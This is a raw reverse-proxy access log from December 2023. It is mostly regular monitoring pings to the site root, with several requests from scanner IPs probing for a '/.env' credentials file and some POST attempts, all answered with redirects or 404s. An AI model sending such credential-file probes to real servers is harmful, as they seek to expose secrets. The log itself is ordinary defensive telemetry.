159.203.109.206 - - [16/Dec/2023:23:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4038 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4039 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:23:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4040 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4041 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4042 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4043 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4044 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4045 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4046 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4047 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4048 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4049 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4050 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:23:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4051 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4052 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4053 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4054 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4055 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4056 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4057 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:23:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4058 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4059 "www@docker" "http://172.29.0.8:80" 0ms
54.37.79.75 - - [16/Dec/2023:23:58:44 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4060 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:23:58:45 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4061 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:23:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4062 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:23:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4063 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4064 "www@docker" "http://172.29.0.8:80" 0ms
45.95.146.86 - - [17/Dec/2023:00:00:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4065 "web-to-websecure@internal" "-" 0ms
45.95.146.86 - - [17/Dec/2023:00:00:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4066 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:00:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4067 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4068 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4069 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4070 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4071 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4072 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4073 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4074 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4075 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4076 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4077 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4078 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4079 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4080 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4081 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4082 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4083 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [17/Dec/2023:00:08:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4084 "web-to-websecure@internal" "-" 0ms
185.180.143.49 - - [17/Dec/2023:00:09:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4085 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:00:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4086 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4087 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4088 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4089 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4090 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4091 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4092 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4093 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4094 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4095 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4096 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4097 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4098 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4099 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4100 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4101 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4102 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4103 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4104 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4105 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4106 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4107 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4108 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4109 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4110 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4111 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4112 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4113 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4114 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4115 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4116 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4117 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4118 "www@docker" "http://172.29.0.8:80" 0ms
103.99.0.154 - - [17/Dec/2023:00:25:28 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4119 "web-to-websecure@internal" "-" 0ms
103.99.0.154 - - [17/Dec/2023:00:25:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4120 "web-to-websecure@internal" "-" 0ms
103.99.0.154 - - [17/Dec/2023:00:25:34 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4121 "-" "-" 0ms
103.99.0.154 - - [17/Dec/2023:00:25:36 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 4122 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:00:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4123 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [17/Dec/2023:00:26:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4124 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:00:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4125 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4126 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4127 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4128 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4129 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4130 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4131 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4132 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4133 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4134 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4135 "www@docker" "http://172.29.0.8:80" 0ms
167.94.145.59 - - [17/Dec/2023:00:31:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4136 "-" "-" 0ms
167.94.145.59 - - [17/Dec/2023:00:31:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4137 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:00:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4138 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4139 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4140 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4141 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4142 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4143 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4144 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4145 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4146 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4147 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4148 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4149 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4150 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4151 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4152 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4153 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4154 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4155 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4156 "www@docker" "http://172.29.0.8:80" 0ms
78.153.140.221 - - [17/Dec/2023:00:41:04 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4157 "-" "-" 0ms
78.153.140.221 - - [17/Dec/2023:00:41:04 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 4158 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:00:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4159 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4160 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4161 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4162 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4163 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4164 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4165 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4166 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4167 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4168 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4169 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4170 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4171 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4172 "www@docker" "http://172.29.0.8:80" 0ms
192.155.88.231 - - [17/Dec/2023:00:48:20 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4173 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:00:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4174 "www@docker" "http://172.29.0.8:80" 0ms
172.105.128.11 - - [17/Dec/2023:00:48:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4175 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:00:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4176 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4177 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4178 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4179 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4180 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4181 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4182 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4183 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4184 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4185 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:00:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4186 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4187 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4188 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4189 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4190 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [17/Dec/2023:00:56:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4191 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [17/Dec/2023:00:56:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4192 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:00:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4193 "www@docker" "http://172.29.0.8:80" 0ms
2.56.247.167 - - [17/Dec/2023:00:56:35 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4194 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:00:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4195 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4196 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4197 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:00:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4198 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4199 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:00:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4200 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:00:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4201 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4202 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4203 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4204 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4205 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4206 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4207 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [17/Dec/2023:01:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4208 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4209 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:04:03 +0000] "GET /logs HTTP/2.0" 301 169 "-" "-" 4210 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:04:03 +0000] "GET /logs/ HTTP/2.0" 200 1121 "-" "-" 4211 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:04:03 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 404 555 "-" "-" 4212 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4213 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [17/Dec/2023:01:04:35 +0000] "GET /logs/styles.css?version=0.7 HTTP/2.0" 404 555 "-" "-" 4214 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4215 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [17/Dec/2023:01:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4216 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [17/Dec/2023:01:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4217 "www@docker" "http://172.29.0.8:80" 0ms
45.43.33.218 - - [17/Dec/2023:01:05:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4218 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:01:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4219 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [17/Dec/2023:01:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4220 "www@docker" "http://172.29.0.8:80" 0ms
41.76.195.60 - - [17/Dec/2023:01:06:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4221 "web-to-websecure@internal" "-" 0ms
